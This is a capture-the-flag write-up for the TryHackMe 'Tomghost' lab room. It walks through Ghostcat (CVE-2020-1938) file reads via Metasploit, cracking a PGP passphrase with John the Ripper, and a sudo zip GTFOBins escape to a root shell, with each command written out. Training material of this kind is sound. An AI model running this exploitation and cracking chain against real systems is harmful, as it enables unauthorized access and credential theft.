# CTF Write-up: Tomghost
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Date:** March 5, 2026  
**Author:** Yasir  
**CVE:** CVE-2020-1938 — Ghostcat  
**Status:** ✅ Completed  
**Room:** https://tryhackme.com/room/tomghost

> ⚠️ **Spoiler Warning:** This write-up contains hints and methodology. Try the room yourself before reading!

---

## Overview

Tomghost centres around the real-world **Ghostcat vulnerability (CVE-2020-1938)** in Apache Tomcat. It introduces CVE exploitation via Metasploit, PGP encryption cracking, and a zip GTFOBins privilege escalation technique.

| Item | Details |
|------|---------|
| Target IP | 10.113.189.235 |
| CVE | CVE-2020-1938 — Ghostcat Apache Tomcat AJP LFI |
| Flags | 2 (user + root) |
| Tools | Nmap, Metasploit, gpg2john, John the Ripper, SSH, GTFOBins |

---

## Step 1 — Nmap Scan

```bash
nmap -p- --min-rate 5000 -sV 10.113.189.235
```

Key findings:
- Port 22 — SSH
- Port 8080 — Apache Tomcat 9.0.30
- Port 8009 — **Apache AJP (Jserv Protocol v1.3)** ← The vulnerability!

> 💡 **Tip:** Port 8009 + Apache Tomcat = Ghostcat CVE-2020-1938. Always check this combination!

---

## Step 2 — Ghostcat Exploitation (CVE-2020-1938)

Ghostcat is a critical LFI vulnerability in Apache Tomcat's AJP connector — allows unauthenticated file reads.

```bash
msfconsole
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS [TARGET_IP]
set RPORT 8009
run
```

Metasploit saved output to a loot file. Reading it revealed plaintext SSH credentials in the web.xml description field. ✅

> 💡 **Tip:** Always read the saved loot file after running Metasploit modules — the credentials are saved there, not always shown on screen.

---

## Step 3 — SSH Login & File Discovery

SSH'd in with credentials from web.xml. Found:
- `tryhackme.asc` — PGP private key
- `credential.pgp` — PGP encrypted credentials

Found user flag in /home/merlin/user.txt ✅

---

## Step 4 — PGP Cracking

Downloaded both files and cracked the PGP key passphrase:

```bash
scp [user]@[TARGET_IP]:/home/[user]/tryhackme.asc .
scp [user]@[TARGET_IP]:/home/[user]/credential.pgp .
gpg2john tryhackme.asc > pgp_hash.txt
john pgp_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

John cracked the passphrase. Then decrypted the credentials:

```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```

Got merlin's password and SSH'd in as merlin. ✅

> 💡 **Tip:** PGP has two layers — the file encryption AND the key passphrase. gpg2john extracts the passphrase hash so John can crack it.

---

## Step 5 — Privilege Escalation via sudo zip

```bash
sudo -l
# Result: (root:root) NOPASSWD: /usr/bin/zip
```

GTFOBins zip exploit — important: replace placeholder with real temp path:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT '/bin/sh #'
cat /root/root.txt
```

Root flag captured! ✅

> 💡 **Tip:** GTFOBins uses /path/to/file as a placeholder — always replace with $(mktemp -u) for a valid temp path!

---

## Flags

| Flag | Location | Method |
|------|----------|--------|
| 👤 User Flag | /home/merlin/user.txt | Ghostcat exploit + SSH |
| 👑 Root Flag | /root/root.txt | PGP crack + sudo zip GTFOBins |

---

## What I Learned

- Port 8009 AJP + Apache Tomcat = Ghostcat CVE-2020-1938
- Metasploit tomcat_ghostcat reads sensitive files via LFI
- web.xml often contains plaintext credentials
- PGP encryption has two layers — gpg2john cracks the key passphrase
- GTFOBins placeholders must be replaced with real paths using mktemp -u
- zip -TT executes commands — abused for root shell

---

*Write-up by Yasir | TryHackMe Junior Penetration Tester Path*  
*Room: [Tomghost](https://tryhackme.com/room/tomghost)*
